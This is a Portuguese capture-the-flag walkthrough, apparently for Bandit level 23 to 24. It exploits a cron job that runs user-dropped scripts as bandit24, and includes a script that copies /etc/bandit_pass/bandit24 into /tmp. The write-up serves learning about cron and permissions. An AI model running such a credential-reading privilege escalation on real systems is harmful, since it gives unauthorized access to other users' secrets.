# Bandit 23 → 24

## Objetivo

Obter a senha do usuário `bandit24` explorando o funcionamento de uma tarefa agendada pelo `cron`, responsável por executar scripts armazenados em um diretório específico.

## Investigação

A investigação começou pela configuração da tarefa agendada:

```bash
cat /etc/cron.d/cronjob_bandit24
```

A configuração indicava que o script `/usr/bin/cronjob_bandit24.sh` era executado como `bandit24` na inicialização do sistema e a cada minuto.

Para analisar seu funcionamento:

```bash
cat /usr/bin/cronjob_bandit24.sh
```

O script percorria o diretório `/var/spool/bandit24/foo` e verificava duas condições antes de executar cada item:

- O proprietário precisava ser `bandit23`, identificado pelo comando `stat`.
- O item precisava ser um arquivo regular, verificado por `-f`.

Os arquivos aceitos eram executados com um limite de 60 segundos, utilizando `timeout`. Após o processamento, os itens eram removidos pelo script.

## Resolução

### 1. Análise das permissões

Para verificar as permissões do diretório monitorado:

```bash
ls -ld /var/spool/bandit24/foo
```

Resultado:

```text
drwxrwx-wx 5 root bandit24 4096 Nov 22 17:34
```

As permissões `-wx` para outros usuários permitiam criar arquivos e acessar caminhos conhecidos, mas não listar diretamente o conteúdo do diretório.

### 2. Teste de execução automática

Antes de tentar recuperar a senha, foi criado um script para verificar se o `cron` realmente executaria comandos fornecidos pelo usuário `bandit23`.

Conteúdo do script:

```bash
#!/bin/bash
ls /var/spool/bandit24/foo > /tmp/bandit24.txt
```

O arquivo recebeu permissão de execução e foi movido para o diretório monitorado:

```bash
chmod +x /tmp/script2.sh
mv /tmp/script2.sh /var/spool/bandit24/foo
```

Após aguardar a execução da tarefa agendada, o resultado foi consultado:

```bash
cat /tmp/bandit24.txt
```

Saída:

```text
b24
hi
myprgm
```

O resultado confirmou que o script havia sido executado e que sua saída tinha sido gravada em um arquivo acessível pelo `bandit23`.

### 3. Recuperação da senha

Com o mecanismo validado, foi criado um segundo script para ler o arquivo de senha do usuário `bandit24` e redirecionar seu conteúdo para `/tmp`.

```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/senha24.txt
```

O script foi preparado e enviado para execução:

```bash
chmod +x script.sh
mv /tmp/script.sh /var/spool/bandit24/foo
```

Após o processamento pelo `cron`, o arquivo de saída foi consultado:

```bash
cat /tmp/senha24.txt
```

A senha foi recuperada com sucesso, concluindo o objetivo do nível.

## Observações técnicas

- O comando `chmod +x` adiciona permissão de execução ao arquivo, mas não concede privilégios adicionais ao processo.
- A execução direta de um script utiliza o interpretador indicado pelo *shebang*, como `#!/bin/bash`.
- O `cron` executava os scripts com as permissões de `bandit24`, independentemente de terem sido criados por `bandit23`.
- O operador `>` permitiu salvar a saída dos comandos para consulta posterior.
- O `timeout -s 9 60` estabelecia um limite de 60 segundos para a execução.
- A execução não era imediata: foi necessário aguardar o próximo ciclo do `cron`.
- Os diretórios encontrados durante os testes não eram necessários para a resolução.

## Conceitos aprendidos

- Funcionamento de tarefas agendadas com `cron`.
- Diferença entre permissões de arquivos e diretórios.
- Criação e execução de scripts Bash.
- Uso de `chmod +x` e `mv`.
- Verificação de propriedades de arquivos com `stat` e `-f`.
- Estruturas condicionais e de repetição em scripts.
- Redirecionamento de saída com `>`.
- Execução de processos com permissões de outro usuário.
